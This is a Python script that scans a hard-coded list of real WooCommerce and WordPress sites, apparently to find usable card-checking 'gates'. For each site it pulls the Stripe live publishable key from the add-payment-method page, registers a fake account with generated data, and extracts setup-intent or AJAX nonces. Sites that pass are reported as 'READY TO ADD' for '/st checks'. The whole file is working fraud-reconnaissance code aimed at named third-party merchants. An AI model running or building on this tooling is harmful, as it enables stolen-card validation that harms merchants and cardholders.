"""
Test gate readiness check on active DB sites and candidate sites.
Runs a dry-run verification to check if /my-account/add-payment-method/, registration, PK, and nonce extraction actually work!
"""
import asyncio, sys, re, random
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import aiohttp
from aiohttp import ClientTimeout, CookieJar
from faker import Faker

faker = Faker()

TEST_SITES = [
    "https://ea-courses.com",
    "https://dilaboards.com",
    "https://learnclarity.com",
    "https://courses.therisingtide.co",
    "https://skincarebysania.com",
    "https://gracefulartscoliving.com",
    "https://www.organicssky.com",
    "https://www.pureearthcollection.com",
    "https://www.rawpress.co",
    "https://wordpress.tv",
    "https://wordpress.com",
    "https://ma.tt",
]

path_candidates = [
    {"add": "/my-account/add-payment-method/", "post": "/my-account/"},
    {"add": "/en/moj-racun/add-payment-method/", "post": "/en/moj-racun/"},
    {"add": "/moj-racun/add-payment-method/", "post": "/moj-racun/"},
]

nonce_patterns = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
    r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'",
    r'"setupIntentNonce"\s*:\s*"([^"]+)"',
    r'"stripe_setup_nonce"\s*:\s*"([^"]+)"',
    r'"wc_stripe_setup_nonce"\s*:\s*"([^"]+)"',
    r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]{10,})"',
    r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
]

async def verify_real_gate_capability(site_url: str) -> dict:
    result = {"url": site_url, "working_gate": False, "step_failed": "", "pk": "", "nonce": ""}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    
    jar = CookieJar(unsafe=True)
    try:
        async with aiohttp.ClientSession(cookie_jar=jar) as session:
            html_1 = ""
            active_paths = None
            
            # Step 1: Endpoint & PK check
            for paths in path_candidates:
                url_1 = f"{site_url.rstrip('/')}{paths['add']}"
                try:
                    async with session.get(url_1, headers=headers, ssl=False, timeout=ClientTimeout(total=8), allow_redirects=True) as r:
                        if r.status == 200:
                            txt = await r.text(errors="ignore")
                            if "pk_live_" in txt:
                                html_1 = txt
                                active_paths = paths
                                break
                except Exception:
                    pass
                    
            if not active_paths:
                result["step_failed"] = "Endpoint/pk_live_ not found"
                return result

            # Extract PK
            pk_m = re.search(r'pk_live_[a-zA-Z0-9]{24,}', html_1)
            result["pk"] = pk_m.group(0)[:15] + "..." if pk_m else "found"

            # Step 2: Account Registration check
            reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', html_1)
            if not reg_match:
                reg_match = re.search('name="woocommerce-login-nonce" value="(.*?)"', html_1)
                
            if reg_match:
                reg_nonce = reg_match.group(1)
                fake_user = faker.user_name()[:10] + str(random.randint(100, 999))
                data = {
                    'email': faker.email(),
                    'username': fake_user,
                    'woocommerce-register-nonce': reg_nonce,
                    'register': 'Register',
                }
                post_url = f"{site_url.rstrip('/')}{active_paths['post']}"
                try:
                    await session.post(post_url, headers=headers, data=data, ssl=False, timeout=ClientTimeout(total=10))
                except Exception:
                    pass
                    
                # Re-fetch page as logged-in
                try:
                    add_url = f"{site_url.rstrip('/')}{active_paths['add']}"
                    async with session.get(add_url, headers=headers, ssl=False, timeout=ClientTimeout(total=10)) as r_auth:
                        if r_auth.status == 200:
                            html_1 = await r_auth.text(errors="ignore")
                except Exception:
                    pass

            # Step 3: Extract Nonce
            ajax_nonce = None
            for pat in nonce_patterns:
                m = re.search(pat, html_1)
                if m:
                    ajax_nonce = m.group(1)
                    break
                    
            if not ajax_nonce:
                result["step_failed"] = "Registration / Nonce extraction failed"
                return result

            result["nonce"] = ajax_nonce[:10] + "..."
            result["working_gate"] = True

    except Exception as e:
        result["step_failed"] = f"Error: {str(e)[:40]}"

    return result

async def main():
    print("=" * 75)
    print("🔬 REAL GATE CAPABILITY TEST (Checking PK + Account Reg + Nonce Extraction)")
    print("=" * 75)
    
    tasks = [verify_real_gate_capability(url) for url in TEST_SITES]
    results = await asyncio.gather(*tasks)
    
    verified_count = 0
    for r in results:
        status = "✅ READY TO ADD" if r["working_gate"] else "❌ NOT WORKING"
        print(f"{status:16s} | {r['url']:35s} | PK: {r['pk']:18s} | Nonce: {r['nonce']:12s} | {r['step_failed']}")
        if r["working_gate"]:
            verified_count += 1
            
    print("=" * 75)
    print(f"Summary: {verified_count}/{len(TEST_SITES)} sites fully functional for /st checks!")
    print("=" * 75)

if __name__ == "__main__":
    asyncio.run(main())
